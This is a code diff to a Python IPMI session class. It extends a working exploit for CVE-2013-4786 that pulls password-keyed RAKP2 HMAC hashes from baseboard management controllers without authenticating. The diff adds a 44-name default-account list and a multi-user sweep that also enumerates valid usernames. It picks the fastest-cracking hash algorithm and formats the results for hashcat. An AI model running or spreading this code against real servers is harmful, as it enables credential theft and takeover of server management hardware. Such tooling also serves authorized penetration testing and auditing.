@@ -852,47 +852,85 @@ class Session:
         (3, "HMAC-SHA256", 17, 1450, True,  False),
     ]
 
-    def grab_rakp_hashes(self, pad_username: bool = False) -> dict:
-        """CVE-2013-4786: capture the password-keyed RAKP2 HMAC without auth.
+    # Famous default BMC accounts — the no-`-U` default sweep.
+    RAKP_DEFAULT_USERS = ["admin", "USERID", "root", "Administrator", "ADMIN", ""]
+
+    # 44 known default BMC accounts, lifted verbatim from oobscan's user list
+    # (~/src/oob/oobscan users.txt). Credit: oobscan. Enabled via
+    # --extended-user-list. Superset of RAKP_DEFAULT_USERS.
+    RAKP_EXTENDED_USERS = [
+        "", "admin", "Admin", "ADMIN", "administrator", "Administrator",
+        "anonymous", "avid", "bmc", "bmcroot", "Callback", "default",
+        "fbuser", "fwupd", "guest", "icinga", "IPMI_USER", "ipmi",
+        "manager", "monitor", "monitoring", "nagios", "OEM", "openbmc",
+        "operator", "Operator", "root", "service", "sim", "supervisor",
+        "support", "sysadmin", "system", "test", "test1", "test2", "test3",
+        "user", "User", "user1", "USERID", "ydview", "yfadmin", "zabbix",
+    ]
+
+    def grab_rakp_hashes(self, users: list[str] | None = None,
+                         pad_username: bool = False) -> dict:
+        """CVE-2013-4786: capture password-keyed RAKP2 HMACs without auth.
 
         The auth algorithm is attacker-chosen in the Open Session Request and
         sizes the RAKP2 Key Exchange Auth Code (HMAC-MD5=16, SHA1=20,
         SHA256=32). The BMC sends RAKP2 (with that HMAC) BEFORE we prove
         anything in RAKP3 — so we negotiate the fastest-cracking algo the BMC
-        will establish (MD5>SHA1>SHA256), send RAKP1 for a valid username,
-        catch RAKP2, and drop. No RAKP3, no password, no session.
+        will establish (MD5>SHA1>SHA256), send RAKP1 for each username, catch
+        RAKP2, and drop. No RAKP3, no password, no session.
 
-        Needs only a valid username (self.username). Returns a dict with the
-        per-algo attempts and, on success, the captured hash + hashcat salt.
-        Confidentiality algo is irrelevant (RAKP2 is pre-encryption)."""
-        attempts, hit = [], None
-        for auth_alg, name, suite, hc_mode, hex_salt, salt_first in self._RAKP_HASH_ALGOS:
-            try:
-                auth_code, salt = self._grab_one_rakp_hash(suite, pad_username)
-            except IPMIError as e:
-                attempts.append({"alg": name, "suite": suite, "ok": False, "error": str(e)})
-                continue
-            attempts.append({"alg": name, "suite": suite, "ok": True})
-            line = (f"{salt.hex()}:{auth_code.hex()}" if salt_first
-                    else f"{auth_code.hex()}:{salt.hex()}")
-            hit = {
-                "alg": name, "auth_alg": auth_alg, "hc_mode": hc_mode,
-                "hex_salt": hex_salt, "auth_code": auth_code.hex(),
-                "salt": salt.hex(), "line": line,
-                "record": f"{self.username}:{line}",
-            }
-            break
-        return {"host": self.host, "user": self.username,
-                "attempts": attempts, "hash": hit}
+        `users` defaults to [self.username]. A valid username yields a hash; an
+        invalid one gets RAKP2 status 0x0d — so a multi-user sweep doubles as
+        username enumeration. Confidentiality algo is irrelevant (pre-encryption).
 
-    def _grab_one_rakp_hash(self, suite_id: int, pad_username: bool):
-        """One Open Session + RAKP1 with `suite_id`'s auth algo; catch RAKP2 and
-        return (auth_code, salt). Raises IPMIError on rejection. No RAKP3."""
+        The BMC's supported auth algo is user-independent (Open Session succeeds
+        regardless of who you name), so we lock it on the first success and then
+        spend exactly one handshake per remaining user."""
+        users = list(users) if users is not None else [self.username]
+        role = 0x10 | (self.priv & 0x0F)       # name-only-lookup + max priv
+        results, attempts, locked = [], [], None
+        for user in users:
+            uname = user.encode("utf-8")
+            if pad_username:                   # iDRAC-quirk targets only
+                uname = uname.ljust(16, b"\x00")
+            ladder = ([m for m in self._RAKP_HASH_ALGOS if m[2] == locked]
+                      if locked is not None else self._RAKP_HASH_ALGOS)
+            for auth_alg, name, suite, hc_mode, hex_salt, salt_first in ladder:
+                try:
+                    open_state = self._rakp_open(suite)
+                except IPMIError as e:
+                    if locked is None:         # only log algo-probe noise once
+                        attempts.append({"user": None, "alg": name,
+                                         "suite": suite, "ok": False, "error": str(e)})
+                    continue
+                locked = suite                 # Open Session worked → algo supported
+                try:
+                    auth_code, salt = self._rakp_catch(open_state, uname, role)
+                except IPMIError as e:         # 0x0d = unauthorized name (no such user)
+                    attempts.append({"user": user, "alg": name,
+                                     "ok": False, "error": str(e)})
+                    break
+                line = (f"{salt.hex()}:{auth_code.hex()}" if salt_first
+                        else f"{auth_code.hex()}:{salt.hex()}")
+                results.append({
+                    "user": user, "alg": name, "auth_alg": auth_alg,
+                    "hc_mode": hc_mode, "hex_salt": hex_salt,
+                    "auth_code": auth_code.hex(), "salt": salt.hex(),
+                    "line": line, "record": f"{user}:{line}",
+                })
+                break
+            if locked is None:                 # BMC negotiated no hash algo — rest is futile
+                break
+        return {"host": self.host, "users": users,
+                "attempts": attempts, "hashes": results}
+
+    def _rakp_open(self, suite_id: int):
+        """Open Session for `suite_id`'s algo triple. Returns (sid_c, rc, sid_m).
+        User-independent — success proves the BMC will establish this auth algo."""
         import secrets
         cs = CIPHER_SUITES[suite_id]
         sid_c = int.from_bytes(secrets.token_bytes(4), "little") or 1
         rc = secrets.token_bytes(16)
-
         osr = OpenSessionRequest(
             msg_tag=0x00, max_priv=0x00, remote_session_id=sid_c,
             auth_payload=auth_payload(cs.auth_alg),
@@ -905,13 +943,12 @@ class Session:
         ores = reply[OpenSessionResponse]
         if ores.rmcp_status != 0:
             raise IPMIError(f"Open Session status 0x{ores.rmcp_status:02x}")
-        sid_m = ores.managed_session_id
+        return sid_c, rc, ores.managed_session_id
 
-        uname = self.username.encode("utf-8")
-        if pad_username:                       # iDRAC-quirk targets only
-            uname = uname.ljust(16, b"\x00")
-        role = 0x10 | (self.priv & 0x0F)       # name-only-lookup + max priv
-
+    def _rakp_catch(self, open_state, uname: bytes, role: int):
+        """RAKP1 → catch RAKP2 for `uname`; return (auth_code, salt). No RAKP3.
+        Raises IPMIError on RAKP2 status (0x0d = no such user)."""
+        sid_c, rc, sid_m = open_state
         rakp1 = RAKP1(managed_session_id=sid_m, remote_random=rc,
                       role=role, user_name=uname)
         reply = self._send_lanplus_outside_session(0x12, bytes(rakp1))
@@ -919,8 +956,7 @@ class Session:
             raise IPMIError("no RAKP2")
         r2 = reply[RAKP2]
         if r2.rmcp_status != 0:               # 0x0d = unauthorized name
-            raise IPMIError(f"RAKP2 status 0x{r2.rmcp_status:02x} "
-                            f"(bad username '{self.username}'?)")
+            raise IPMIError(f"RAKP2 status 0x{r2.rmcp_status:02x} (unauthorized name?)")
         auth_code = bytes(r2.auth_code)
         if not auth_code:
             raise IPMIError("empty auth code (auth algo = none)")
